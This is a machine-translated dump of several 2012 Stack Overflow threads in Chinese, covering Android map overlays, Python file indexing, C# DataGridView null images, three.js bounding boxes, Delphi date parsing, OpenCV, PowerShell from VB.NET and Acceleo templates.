            case R.id.menu_settings:  startActivity(new Intent(this, SettingsActivity.class));;
            break;
        }
        return true;  } 
```

}

QuoteReader 活动：

```
public class QuoteAdapter extends BaseAdapter {

    private Context mContext;
    private LayoutInflater mInflator;
    private DataSource mDataSource;

    public QuoteAdapter(Context c) {
        mContext = c;
        mInflator = (LayoutInflater) mContext.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        mDataSource = new DataSource();
    }

    public int getCount() {
        return mDataSource.getDataSourceLength();
    }

    public Object getItem(int position) {
        return position;
    }

    public long getItemId(int position) {
        return position;
    }

    public View getView(int position, View convertView, ViewGroup parent) {
        ImageView thumbnail;
        TextView quote;

        if(convertView == null) {
            convertView = mInflator.inflate(R.layout.list_item_layout, parent, false);
        }

        thumbnail = (ImageView) convertView.findViewById(R.list.thumb);
        thumbnail.setImageResource(mDataSource.getmPhotoPool().get(position));

        quote = (TextView) convertView.findViewById(R.list.text);
        quote.setText(mDataSource.getmQuotePool().get(position));
        return convertView;
    }
}

// Rest of QuoteReaderActivty class...

private ListView mListView;

/** Called when the activity is first created. */
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);
    mListView = (ListView) findViewById(R.id.quotes_list);
    mListView.setAdapter(new QuoteAdapter(this));

    mListView.setOnItemClickListener(new AdapterView.OnItemClickListener() {

        public void onItemClick(AdapterView<?> arg0, View arg1, int position,
                long arg3) {
            Intent i = new Intent(QuoteReaderActivity.this, QuoteDetail.class);
            i.putExtra("position", position);
            startActivity(i);
        }

    });
}

@Override
public boolean onCreateOptionsMenu(Menu menu) {
   getMenuInflater().inflate(R.menu.activity_main, menu);
    return true;  }

    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case R.id.menu_me:  startActivity(new Intent(this, AboutmeActivity.class));;
                                break;

            case R.id.menu_settings:  startActivity(new Intent(this, SettingsActivity.class));;
            break;
        }
        return true;  } 
```

}

日期来源：

```
public ArrayList<Integer> getmPhotoHdPool() {
    return mDetail;
}

public ArrayList<Integer> getmWwwPool() {
    return mWww;
}

public ArrayList<Integer> getmTelPool() {
    return mTel;
}

public ArrayList<Integer> getmInfoPool() {
    return mInfo;
}

public ArrayList<Integer> getmEmailPool() {
    return mEmail;
}
public ArrayList<Integer> getmPhotoPool() {
    return mList;
}

public ArrayList<Integer> getmQuotePool() {
    return mText;
}

private void setupPhotoPool() {
    mList.add(R.drawable.tcs_1);
    mList.add(R.drawable.tcs_1);
    mList.add(R.drawable.tcs_1);
    mList.add(R.drawable.tcs_1);
    mList.add(R.drawable.tcs_1);
    mList.add(R.drawable.tcs_1);
    mList.add(R.drawable.tcs_1);
    mList.add(R.drawable.tcs_1);
    mList.add(R.drawable.tcs_1);
    mList.add(R.drawable.tcs_1);
    mList.add(R.drawable.tcs_1);

}

private void setupQuotePool() {
    mText.add(R.string.quote_1);
    mText.add(R.string.quote_2);
    mText.add(R.string.quote_3);
    mText.add(R.string.quote_4);
    mText.add(R.string.quote_5);
    mText.add(R.string.quote_6);
    mText.add(R.string.quote_7);
    mText.add(R.string.quote_8);
    mText.add(R.string.quote_9);
    mText.add(R.string.quote_10);
    mText.add(R.string.quote_001);

}

private void setupEmailPool() {
    mEmail.add(R.string.email_1);
    mEmail.add(R.string.email_2);
    mEmail.add(R.string.email_3);
    mEmail.add(R.string.email_4);
    mEmail.add(R.string.email_5);
    mEmail.add(R.string.email_6);
    mEmail.add(R.string.email_7);
    mEmail.add(R.string.email_8);
    mEmail.add(R.string.email_9);
    mEmail.add(R.string.email_10);
    mEmail.add(R.string.email_001);

}

private void setupTelPool() {
    mTel.add(R.string.tel_1);
    mTel.add(R.string.tel_2);
    mTel.add(R.string.tel_3);
    mTel.add(R.string.tel_4);
    mTel.add(R.string.tel_5);
    mTel.add(R.string.tel_6);
    mTel.add(R.string.tel_7);
    mTel.add(R.string.tel_8);
    mTel.add(R.string.tel_9);
    mTel.add(R.string.tel_10);
    mTel.add(R.string.tel_001);

}

private void setupWwwPool() {
    mWww.add(R.string.www_1);
    mWww.add(R.string.www_2);
    mWww.add(R.string.www_3);
    mWww.add(R.string.www_4);
    mWww.add(R.string.www_5);
    mWww.add(R.string.www_6);
    mWww.add(R.string.www_7);
    mWww.add(R.string.www_8);
    mWww.add(R.string.www_9);
    mWww.add(R.string.www_10);
    mWww.add(R.string.www_001);

}
private void setupPhotoHDPool() {
    mDetail.add(R.drawable.caming_hd_1);
    mDetail.add(R.drawable.caming_hd_1);
    mDetail.add(R.drawable.camping_hd_1);
    mDetail.add(R.drawable.camping_hd_1);
    mDetail.add(R.drawable.camping_hd_1);
    mDetail.add(R.drawable.camping_hd_1);
    mDetail.add(R.drawable.camping_hd_1);
    mDetail.add(R.drawable.camping_hd_1);
    mDetail.add(R.drawable.camping_hd_1);
    mDetail.add(R.drawable.camping_hd_1);
    mDetail.add(R.drawable.camping_hd_1);
    mDetail.add(R.drawable.camping_hd_1);}

       private void setupInfoPool() {
            mInfo.add(R.string.detail_1);
            mInfo.add(R.string.detail_2);
            mInfo.add(R.string.detail_3);
            mInfo.add(R.string.detail_4);
            mInfo.add(R.string.detail_5);
            mInfo.add(R.string.detail_6);
            mInfo.add(R.string.detail_7);
            mInfo.add(R.string.detail_8);
            mInfo.add(R.string.detail_9);
            mInfo.add(R.string.detail_10);
            mInfo.add(R.string.detail_001);

}

public int getDataSourceLength() {
    return mList.size();
}

public DataSource() {
    mList = new ArrayList<Integer>();
    mText = new ArrayList<Integer>();
    mInfo = new ArrayList<Integer>();
    mDetail = new ArrayList<Integer>();
    mEmail = new ArrayList<Integer>();
    mTel = new ArrayList<Integer>();
    mWww = new ArrayList<Integer>();
    setupPhotoPool();
    setupQuotePool();
    setupInfoPool();
    setupPhotoHDPool();
    setupEmailPool();
    setupTelPool();
    setupWwwPool();

} 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T05:57:03.240

我也在使用这个链接，[http://www.codemobiles.com/forum/code-mobile-topic-4180.html](http://www.codemobiles.com/forum/code-mobile-topic-4180.html) 一些代码被添加，

MyMap.java 类

```
public class MyMap extends MapActivity {

MapView mapView;
List<Overlay> mapOverlays;
Drawable drawable;
Drawable drawable2;
MyItemizedOverlay itemizedOverlay;
//MyItemizedOverlay itemizedOverlay2;

@Override
public void onCreate(Bundle savedInstanceState) {

    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    mapView = (MapView) findViewById(R.id.mapview);
    mapView.setBuiltInZoomControls(true);

    mapOverlays = mapView.getOverlays();

    // first overlay
    drawable = getResources().getDrawable(R.drawable.marker);
    itemizedOverlay = new MyItemizedOverlay(drawable, mapView);

    GeoPoint point = new GeoPoint((int) (51.5174723 * 1E6),
            (int) (-0.0899537 * 1E6));
    OverlayItem overlayItem = new OverlayItem(point, "Umar Shafique",
            "(here goes 1)");
    itemizedOverlay.addOverlay(overlayItem);

    GeoPoint point2 = new GeoPoint((int) (51.515259 * 1E6),
            (int) (-0.086623 * 1E6));
    OverlayItem overlayItem2 = new OverlayItem(point2, "Abdul Karim",
            "here goes 2");
    itemizedOverlay.addOverlay(overlayItem2);

    mapOverlays.add(itemizedOverlay);

    // second overlay
/*  drawable2 = getResources().getDrawable(R.drawable.marker2);
    itemizedOverlay2 = new MyItemizedOverlay(drawable2, mapView);

    GeoPoint point3 = new GeoPoint((int) (51.513329 * 1E6),
            (int) (-0.08896 * 1E6));
    OverlayItem overlayItem3 = new OverlayItem(point3, "Arslan Ilyas",
            "here goes 3");
    itemizedOverlay2.addOverlay(overlayItem3);

    GeoPoint point4 = new GeoPoint((int) (51.51738 * 1E6),
            (int) (-0.08186 * 1E6));
    OverlayItem overlayItem4 = new OverlayItem(point4, "Ahsan",
            "here goes 4");
    itemizedOverlay2.addOverlay(overlayItem4);

    mapOverlays.add(itemizedOverlay2);*/

    final MapController mc = mapView.getController();
    mc.animateTo(point2);
    mc.setZoom(16);

}

@Override
protected boolean isRouteDisplayed() {
    return false;
} 
```

}

这里我注释了一些代码，因为这里添加了两个 itemizedOverlay ，所以一个是注释。

和 MyItemizedOverlay.java 类

```
public class MyItemizedOverlay extends BalloonItemizedOverlay<OverlayItem> {

private ArrayList<OverlayItem> m_overlays = new ArrayList<OverlayItem>();
private Context c;

public MyItemizedOverlay(Drawable defaultMarker, MapView mapView) {
    super(boundCenter(defaultMarker), mapView);
    c = mapView.getContext();
}

public void addOverlay(OverlayItem overlay) {
    m_overlays.add(overlay);
    populate();
}

@Override
protected OverlayItem createItem(int i) {
    return m_overlays.get(i);
}

@Override
public int size() {
    return m_overlays.size();
}

@Override
protected boolean onBalloonTap(int index) {
    Toast.makeText(c, "onBalloonTap for overlay index " + index,
            Toast.LENGTH_LONG).show();

    if (index == 0) {
        c.startActivity(new Intent(c.getApplicationContext(),
                NewActivity.class));
    } else {
         c.startActivity(new Intent(c.getApplicationContext(),
         secondNewActivity.class));
    }
    return true;
} 
```

}

这里修改代码

> ```
>  if (index == 0) {
>         c.startActivity(new Intent(c.getApplicationContext(),
>                 NewActivity.class));
>     } else {
>          c.startActivity(new Intent(c.getApplicationContext(),
>          secondNewActivity.class));
>     }
>     return true;
> } 
> ```

按气球二，我们可以改变索引位置。我们可以通过您的意图传递索引位置。

提供您的代码，只有 Easy the Explain。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:34:21.697

在 Itemized Overlay onClick 处理程序中，添加一个 intentExtra，以便您可以将识别信息传递给您的 QuoteDetail.class。您很可能希望使用自己的类扩展 ItemizedOverlay 类，添加可用于标识项目的成员变量。然后只需访问这些成员变量并将它们作为 intentExtras 传递给 QuoteDetail。

# python - 如何获取文件夹中文件的序列号？

> ID：11782109
> 
> 赞同：2
> 
> 时间：2012-08-02T16:45:19.863
> 
> 标签：python

我有 Windows 电脑。我的脚本应该识别文件夹中命令行中传递的文件的序号，即

```
myscript.py \\network-drive\files\Long-long.file.name.with.numbers.txt 
```

文件夹内容如下：

```
\\network-drive\files\
    folder1
    folder2
    file1
    file2
    Long.long.file.name.with.numbers.txt
    file3
    file4 
```

我的脚本应该识别命令行中给出的文件的序列号，即应该返回 5（文件夹也将被计算在内；假设文件按名称排序）。

**更新**。我已经停止了以下操作：

```
import sys
import os.path

if sys.argv[1]: # regardless of this verification, exception happens if argument is not passed
    head, tail = os.path.split(sys.argv[1])
    print head
    print os.listdir(head) 
```

返回的列表`listdir`不允许我识别什么是文件夹和什么是文件。所以，我不能正确地对它们进行排序。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T18:08:01.180

您正在尝试解决几个问题，以及解决方案的几个选项。

第一 - 您是否正在寻找*自然排序*的东西，即：

```
/path/to/folder/
  subfolder01/
  test1.png
  test2.png
  test3.png
  test10.png
  test11.png 
```

如果是这样...您将需要创建一个自然排序方法。如果您对字母数字排序感到满意：

```
/path/to/folder/
  subfolder01/
  test1.png
  test10.png
  test11.png
  test2.png
  test3.png 
```

然后标准排序将起作用。根据您对文件进行排序的方式，结果的索引会有所不同。

要从系统中获取目录和文件，您可以使用以下两种方法之一 - 不能 100% 确定哪种方法更快，因此请同时测试它们。我将把答案分成几块，这样你就可以把它拼凑起来，看起来最合适：

**第 01 部分：初始化**

```
import os
import sys

try:
    searchpath = sys.argv[1]
except IndexError:
    print 'No searchpath supplied'
    sys.exit(0)

basepath, searchname = os.path.split(searchpath) 
```

**Part 02：收集文件夹和文件**

*选项 #1：os.listdir + os.path.isfile*

```
files   = []
folders = []
for filepath in os.listdir(basepath):
    if ( os.path.isfile(filepath) ):
        files.append(filepath)
    else:
        folders.append(folder) 
```

*选项#2：os.walk*

```
# we only want the top level list of folders and files,
# so break out of the loop after the first result
for basepath, folders, files in os.walk(basepath):
    break 
```

**Part 03：计算索引**

*选项#1：不排序——你从系统中得到的就是你得到的*

```
# no sorting
try:
    index = len(folders) + files.index(searchname)
except IndexError:
    index = -1 
```

*选项 #2：字母数字排序*

```
# sort alpha-numerically (only need to sort the files)
try:
    index = len(folders) + sorted(files).index(searchname)
except IndexError:
    index = -1 
```

*选项#3：自然排序*

```
# natural sort using the projex.sorting.natural method
import projex.sorting
sorted_files = sorted(files, projex.sorting.natural)
try:
    index = len(folders) + sorted_files.index(searchname)
except IndexError:
    index = -1 
```

**第 04 部分：记录结果**

```
# if wanting a 1-based answer
index += 1
print index 
```

我不打算详细介绍自然排序，因为这不是问题的一部分——我认为这里还有其他论坛，你可以在这方面找到建议。projex.sorting 模块是我编写的模块，如果您想查看它的确切实现，可以在这里找到： [http ://dev.projexsoftware.com/projects/projex。](http://dev.projexsoftware.com/projects/projex)

可以说这将是结果的差异：

```
>>> import pprint, projex.sorting
>>> files = ['test2.png', 'test1.png', 'test10.png', 'test5.png', 'test11.png']
>>> print files.index('test10.png')
2
>>> print sorted(files).index('test10.png')
1
>>> print sorted(files, projex.sorting.natural).index('test10.png')
3
>>> print files
['test2.png', 'test1.png', 'test10.png', 'test5.png', 'test11.png']
>>> print sorted(files)
['test1.png', 'test10.png', 'test11.png', 'test2.png', 'test5.png']
>>> print sorted(files, projex.sorting.natural)
['test1.png', 'test2.png', 'test5.png', 'test10.png', 'test11.png'] 
```

因此，当您使用它时，请记住这一点。

干杯!

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T17:11:00.220

看起来像这样的东西应该可以工作：

```
import os
import glob
import sys
import os.path as path

try:
    directory,file = path.split( sys.argv[1] )
    def sort_func(fname):
        """
        Russian directories , english directories, russian files then english files
        although, honestly I don't know how russian files will actually be sorted ...
        """
        fullname = path.join(directory,fname)
        isRussian = any(ord(x) > 127 for x in fullname)
        isDirectory = path.isdir(fullname)
        return ( not isDirectory, not isRussian, fullname)

    files = sorted( os.listdir(directory), key=sort_func)
    print ( files.index(file) + 1 )

except IndexError:
    print "oops, no commandline arguments" 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T17:09:44.353

```
from os import listdir
from sys import argv
from os.path import *
print listdir(dirname(argv[1]).index(basename(argv[1])) 
```

但它真的没有任何意义，甚至无法想象你需要的用例。详情请参阅`os.path`。

# c# - 从 DataTable 填充时如何禁用 DataGridView 图像列中的 Null 图像

> ID：11782112
> 
> 赞同：16
> 
> 时间：2012-08-02T16:45:33.110
> 
> 标签：c#, .net, winforms, image, datagridview

我有一个现有应用程序，需要在 DataGridView 单元格中显示图像以表示记录是否具有与之关联的特定标志（用户不可编辑，这来自数据库）。

如果有标志，我会显示相应的图像，如果没有标志，我不想在列中显示任何内容。

DataGridView 列不是在 Visual Studio 设计器中创建的，否则这很容易。我可以在列上设置 NullValue 属性。而是在运行时将所有数据加载到 DataTable 时创建列，然后从该 DataTable 创建 DataView，然后将 DataGridView 的 Datasource 设置为 DataView。

我不能完全重写它，否则我只会在 VS Designer 中定义列，而不是这种荒谬的方式，即让列从 DataTable 中定义。

那么我的问题是，当基础数据表为空时，如何使带有图像的列不显示任何内容？

这是一些伪 C# 来说明我的意思。请记住，我写它不是为了使用这样的两个 DataTable；当我把它交给我的时候就是这样，我不想为了添加一个新列而做出巨大的改变......

```
DataTable rawData = someMethodThatReturnsMyRawData();
DataTable data = new DataTable();
data.Columns.Add("Flags", typeof(Image));
data.Columns.Add("SomeOtherColumn");

foreach (DataRow rawDataRow in rawData.Rows)
{
    DataRow dataRow = data.NewRow();
    bool hasFlagType1 = false;
    bool hasFlagType2 = false;

    if (rawDataRow["FlagType1ID"] != DBNull.Value)
    {
        hasFlagType1 = true;
    }

    if (rawDataRow["FlagType2ID"] != DBNull.Value)
    {
        hasFlagType2 = true;
    }

    if (hasFlagType1 && hasFlagType2)
    {
        dataRow[0] = Properties.Resources.BothFlagsImage;
    }
    else if (hasFlagType1)
    {
        dataRow[0] = Properties.Resources.FlagType1Image;
    }
    else if (hasFlagType2)
    {
        dataRow[0] = Properties.Resources.FlagType2Image;
    }
    else
    {
        //If neither flag set, I don't want it to show anything,
        //but if I leave it as null, a little box with an X in it shows up
        //I could set it to some transparent GIF here, but that seems lame
    }

    dataRow[1] = rawDataRow["SomeOtherColumn"];

    data.Rows.Add(dataRow);        
}

DataView dv = new DataView(data, string.Empty, "SomeOtherColumn ASC", DataViewRowState.CurrentRows);

this.emptyDataGridViewFromDesigner.DataSource = dv;

// How can I modify the column "Flags" at this point to show nothing if the value is null? 
```

编辑：这是一个截图，所以你可以看到我所说的带有 X 的小盒子的意思 - 这些都是空的......

![具有空图像的 DataGridView](../Images/61790b38476ca75a20f8a16c879f119d.png)

此外，它必须是 .NET 3.5，所以如果只有 .NET 4.0 有解决方案，那我就不走运了。

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-08-02T17:20:28.313

我想通了...

必须将该列转换为 DataGridViewImageColumn，然后将该列的 DefaultCellStyle.NullValue 设置为 null。从我上面的例子中，你会这样做......

```
((DataGridViewImageColumn)this.emptyDataGridViewFromDesigner.Columns["Flags"]).DefaultCellStyle.NullValue = null; 
```

我想我在这里过问了，但希望这对其他人有所帮助。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2019-06-26T00:15:28.230

简单地分配`new Bitmap(1,1);`给单元格的`.Value`属性并继续前进要容易得多。每当我尝试将 NULL 分配给单元格的值时，我的应用程序都会引发异常，即使已修改`DefaultCellStyle.NullValue`

这样的事情每次都按预期工作，没有任何麻烦或神秘/晦涩的设置：

```
dataGridView1.Rows[index].Cells["CellName"].Value = isFlag ? Properties.Resources.FlagImage : new Bitmap(1,1); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-03-15T04:40:49.797

要修复整个网格，只需将此代码添加到 Form 构造函数。（并更改您的数据网格的名称）：

```
 Load += delegate
        {
            // remove default [x] image for data DataGridViewImageColumn columns
            foreach (var column in dataGridView1.Columns)
            {
                if (column is DataGridViewImageColumn)
                    (column as DataGridViewImageColumn).DefaultCellStyle.NullValue = null;
            }
        }; 
```

# javascript - 使用 ObjLoader three.js 后如何计算边界框

> ID：11782113
> 
> 赞同：1
> 
> 时间：2012-08-02T16:45:37.913
> 
> 标签：javascript, three.js

在使用 OBJLoader 加载模型后，我在尝试获取模型几何图形的边界框时遇到了问题。到目前为止，我有：

```
var loader = new THREE.OBJLoader();
loader.load( mURL, function ( object ) {

for ( var i = 0, l = object.children.length; i < l; i ++ ) {
    geometry = object.children[0].geometry;         
    bBox = geometry.computeBoundingBox();
    console.log("have a box of "+bBox);
}
//...rest of function 
```

但是当我将 bBox 写入控制台时，它是未定义的。在这种情况下，几何不是访问的正确属性吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-03T01:40:56.800

我认为这样的事情应该可以解决问题：

```
var loader = new THREE.OBJLoader();
loader.load( mURL, function ( object ) {

    THREE.SceneUtils.traverseHierarchy( object, function ( child ) {

        if ( child instanceof THREE.Mesh ) {

            child.geometry.computeBoundingBox();

        }

    }

} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-02-20T20:22:24.997

这个答案结合了最新版本 THREE.js 的最后一个

```
var loader = new THREE.OBJLoader();
loader.load( mURL, function ( object ) {
object.traverse(function ( child ) {
    if ( child instanceof THREE.Mesh ) {
        child.geometry.computeBoundingBox();
        object.bBox = child.geometry.boundingBox;//<-- Actually get the variable
    }
});
}; 
```

现在，您可以通过键入 object.bBox.max.x 来访问网格的尺寸，例如获取 x。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-06-27T21:19:44.150

@mrdoob's answer was correct but due to three.js API changes (as of r52), it should look like this now:

```
var loader = new THREE.OBJLoader();
loader.load( mURL, function ( object ) {
    object.traverse(function ( child ) {
        if ( child instanceof THREE.Mesh ) {
            child.geometry.computeBoundingBox();
        }
    });
}; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-03T03:51:52.563

基于 mrdoob 的 traverse 函数，我能够得到一个具有以下内容的边界框：

```
var loader = new THREE.OBJLoader();
loader.load( mURL, function ( object ) {
    THREE.SceneUtils.traverseHierarchy(object, function(child){
    if(child instanceof THREE.Mesh){
        for (var i in child) {
            if(i == "geometry"){
                var geo = child[i];
                    geo.computeBoundingBox();
                    var bBox = geo.boundingBox;
                }
             }
         }
      });
      ///rest of loading function here
 }); 
```

# delphi - 如何将 str 转换为日期时间？

> ID：11782114
> 
> 赞同：3
> 
> 时间：2012-08-02T16:45:39.830
> 
> 标签：delphi, datetime, date

如何将“2012 年 8 月 2 日 18:53”转换为 DateTime？

当我使用 StrToDate 进行转换时，会出现错误“日期格式无效”

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-02T16:50:42.083

您可以使用`VarToDateTime`（在`Variants`单元中找到），它支持 Delphi 的 RTL 不支持的各种时间格式。（它基于 COM 的日期支持例程，如各种 Microsoft 产品中使用的例程。）我用您提供的日期进行了测试，它确实将其转换为`TDateTime`正确的。在 Delphi 2007 和 XE2 上测试。

```
program Project2;

{$APPTYPE CONSOLE}

{$R *.res}

uses
  SysUtils, Variants;

var
  DT: TDateTime;
  TestDate: String;

begin
  TestDate := '02 August 2012 18:53';

  try
    DT := VarToDateTime(TestDate);
    { TODO -oUser -cConsole Main : Insert code here }
  except
    on E:Exception do
      Writeln(E.Classname, ': ', E.Message);
  end;
  Writeln(FormatDateTime('mm/dd/yyyy hh:nn', DT));
  Readln;
end. 
```

当前[文档](http://docwiki.embarcadero.com/Libraries/en/System.Variants.VarToDateTime)中的更多信息，包括另一个使用示例（该页面底部的链接）。

注意`Variants`单元中的函数使用默认的用户语言环境。如果不是“US”，则上述字符串的转换可能会失败。在这种情况下，您最好`VarDateFromStr`直接从`activex`指定美国语言环境的单位调用：

```
uses
  sysutils, activex, comobj;

var
  TestDate: String;
  DT: TDateTime;
begin
  try
    TestDate := '02 August 2012 18:53';
    OleCheck(VarDateFromStr(WideString(TestDate), $0409, 0, Double(DT)));
    Writeln(FormatDateTime('mm/dd/yyyy hh:nn', DT));
    Readln;
  except
    on E:Exception do
      Writeln(E.Classname, ': ', E.Message);
  end;
end. 
```

# opencv - 更新 OpenCv 中每个像素的平均值

> ID：11782115
> 
> 赞同：0
> 
> 时间：2012-08-02T16:45:40.757
> 
> 标签：opencv

到这里为止，我的代码如下：

```
 IplImage* firstImg ;
IplImage* secondImg;

cv::Mat firstMat ( firstImg );
cv::Mat secondMat ( secondImg );
cv::Mat subMat = firstMat - secondMat;
cv::Mat medianMat;

int d = 5;
cv::medianBlur ( subMat, medianMat, d );

cv::Mat BGModel;
BGModel = firstMat - medianMat ; 

CvSize size; 
size.width = BGModel.cols;
size.height = BGModel.rows;

IplImage* BGImg;
cvSetData ( BGImg, BGModel.data, size.width * 3  ); 
```

然后我想不出任何方法来继续我的下一步，其中我需要更新背景模型中每个像素的平均值相对于来自两个图像的中值滤波的差异图像。有人可以帮忙吗？示例代码将不胜感激。提前谢谢了！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-03T16:47:15.003

我实际上并没有收到您的问题，但如果您正在寻找移动物体检测和背景建模，这里有帮助您的链接

高斯 [背景建模](http://mmlab.disi.unitn.it/wiki/index.php/Mixture_of_Gaussians_using_OpenCV)远远优于中值背景建模。该链接还有一些示例代码....

# vb.net - 如何在 VB.Net 中运行 Powershell 脚本

> ID：11782121
> 
> 赞同：3
> 
> 时间：2012-08-02T16:45:55.260
> 
> 标签：vb.net, powershell, exchange-server

我需要在 VB.Net 中运行 Exchange 2007 powershell 脚本，但我似乎找不到一种方法来显示如何在加载模块的情况下执行此操作。

最好的方法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T17:57:52.300

您可以在 VB 中运行 powershell 脚本，看看下面的链接

[http://blogs.msdn.com/b/zainnab/archive/2008/07/26/calling-a-powershell-script-from-your-net-code.aspx](http://blogs.msdn.com/b/zainnab/archive/2008/07/26/calling-a-powershell-script-from-your-net-code.aspx)

上面发布的链接将逐步指导您如何完成此操作。

**查看与您相关的这个问题：** [Running powershell scripts from within a .NET windows app](https://stackoverflow.com/questions/3352933/running-powershell-scripts-from-within-a-net-windows-app)

以下这篇文章是用 C# 编写的，但应该可以帮助您更好地理解这个概念：

[http://www.codeproject.com/Articles/18229/How-to-run-PowerShell-scripts-from-C](http://www.codeproject.com/Articles/18229/How-to-run-PowerShell-scripts-from-C)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-05-05T08:42:43.560

对于 VB.NET，请尝试以下代码：

```
Process.Start("powershell", "-File C:\YourFileLocation") 
```

基本上，您所做的只是调用 PowerShell 并指定一个参数（您正在调用的 cmdlet 的位置）。

# android - 如何在 ImageView 上获取显示图像

> ID：11782133
> 
> 赞同：0
> 
> 时间：2012-08-02T16:47:19.430
> 
> 标签：android

我有这种情况。该应用程序允许我拍摄某物的照片并将其保存到 sqlite db。至此，此应用程序从相机设备捕获图像并将其显示在 ImageView 上。问题是如何从 ImageView 中获取此图像并将其解析为字节数组

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T16:49:56.453

你看过[API](http://developer.android.com/reference/android/widget/ImageView.html#getDrawable%28%29)吗？

简直了

```
Drawable image = imageview.getDrawable(); 
```

获取图像。

# eclipse-emf - 在 Acceleo 中加载 2 个不同的输入模型

> ID：11782134
> 
> 赞同：2
> 
> 时间：2012-08-02T16:47:22.843
> 
> 标签：eclipse-emf, acceleo, emf

我想在我的 Acceleo 主模板中加载 2 个不同的输入模型（一个 .bpel 和一个 .wsdl）。

我为 bpel 和 wsdl 加载了 ecore 元模型，我希望能够使用这样的东西：

```
[comment encoding = UTF-8 /]
[module generate('http:///org/eclipse/bpel/model/bpel.ecore','http://www.eclipse.org/wsdl/2003/WSDL')/]

[import org::eclipse::acceleo::module::sample::files::processJavaFile /]

[template public generate(aProcess : Process, aDefinition : Definition)]
[comment @main /]
    Process Name : [aProcess.name/]
    Def Location : [aDefinition.location/]  

[/template] 
```

但是当我运行 acceleo 模板时，我得到了这个错误：

```
An internal error occurred during: "Launching Generate".
Could not find public template generate in module generate. 
```

我想我必须修改 java 启动器（generate.java），因为现在它不能将 2 个模型作为参数。你知道如何？谢谢！

** Kellindil 建议编辑：

只是想知道我是否理解正确，然后再进行修改：我正在尝试修改 Generate() 构造函数。我将其更改为：

```
//MODIFIED CODE
public Generate(URI modelURI, URI modelURI2, File targetFolder, 
                List<? extends Object> arguments) {
initialize(modelURI, targetFolder, arguments);
} 
```

在一般情况下，我可以看到它调用 AbstractAcceleoGenerator.initialize(URI, File, List>?>)，我应该调用它两次，每个模型一次吗？喜欢：

```
initialize(modelURI, targetFolder, arguments);
initialize(modelURI2, targetFolder, arguments); 
```

然后，在我的 Generate() 构造函数中模仿超级实现中的代码：

```
//NON MODIFIED ACCELEO CODE 
Map<String, String> AbstractAcceleoLauncher.generate(Monitor monitor) {
File target = getTargetFolder();
if (!target.exists() && !target.mkdirs()) {
        throw new IOException("target directory " + target + " couldn't be   created."); //$NON-NLS-1$ //$NON-NLS-2$
    }
    AcceleoService service = createAcceleoService();
    String[] templateNames = getTemplateNames();
    Map<String, String> result = new HashMap<String, String>();
    for (int i = 0; i < templateNames.length; i++) {
        result.putAll(service.doGenerate(getModule(), templateNames[i], getModel(), getArguments(),
                target, monitor));
    }

    postGenerate(getModule().eResource().getResourceSet());
    originalResources.clear();

    return result;
} 
```

我该怎么办？在 initialize() 调用之后，我是否应该尝试在我的 Generate() 构造函数中模仿这个方法正在做什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-06T08:00:13.567

Acceleo 确实可以实现您希望做的事情，但这不是生成的启动器所期望的“默认”情况。

您必须将生成的 java 类的“generate”方法标记为“@generated NOT”（或从其 javadoc 中完全删除“@generated”注释）。在这种方法中，您需要做的是模仿超级实现（在 AbstractAcceleoLauncher 中）的行为，加载两个模型而不是一个模型并将它们传递给 AcceleoService#doGenerate。

换句话说，您需要查看 Acceleo 提供的 API 来生成代码，并以适合您需要的方式使用它。我们生成的 java 启动器和 AcceleoService 类用于提供适合一般用例的示例。可以通过遵循这些示例来更改行为。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-03T15:31:18.140

您不需要修改 Generate.java 类。默认情况下，它应该允许您执行代码生成。

您需要创建一个启动配置并在此启动配置中提供正确的参数（过程和定义），仅此而已。

我不明白作为模块第一个参数的“client.xmi”URI。看起来它是您的模型文件，如果是这样，请将其从参数中删除，它必须只包含您的元模型 URI。

# python - Python OpenCV 轮廓树层次结构

> ID：11782147
> 
> 赞同：13
> 
> 时间：2012-08-02T16:48:18.147
> 
> 标签：python, opencv

我正在尝试使用 OpenCV 实现在 python 中找到[的算法。](http://www.m.cs.osakafu-u.ac.jp/cbdar2007/proceedings/papers/O1-1.pdf)

我正在尝试实现算法的一部分，根据它们拥有的内部边界的数量来删除不相关的边缘边界。

*   如果当前边缘边界恰好有一个或两个内部边缘边界，则可以忽略内部边界
*   如果当前边边界有两个以上的内边边界，则可以忽略

我无法确定从图像中提取的轮廓的树结构。

我目前的来源：

```
import cv2

# Load the image
img = cv2.imread('test.png')
cv2.copyMakeBorder(img, 50,50,50,50,cv2.BORDER_CONSTANT, img, (255,255,255))

# Split out each channel
blue = cv2.split(img)[0]
green = cv2.split(img)[1]
red = cv2.split(img)[2]

# Run canny edge detection on each channel
blue_edges = cv2.Canny(blue, 1, 255)
green_edges = cv2.Canny(green, 1, 255)
red_edges = cv2.Canny(red, 1, 255)

# Join edges back into image
edges = blue_edges | green_edges | red_edges

# Find the contours
contours,hierarchy = cv2.findContours(edges.copy(),cv2.RETR_TREE,cv2.CHAIN_APPROX_SIMPLE)

# For each contour, find the bounding rectangle and draw it
for cnt in contours:
    x,y,w,h = cv2.boundingRect(cnt)
    cv2.rectangle(edges,(x,y),(x+w,y+h),(200,200,200),2)

# Finally show the image
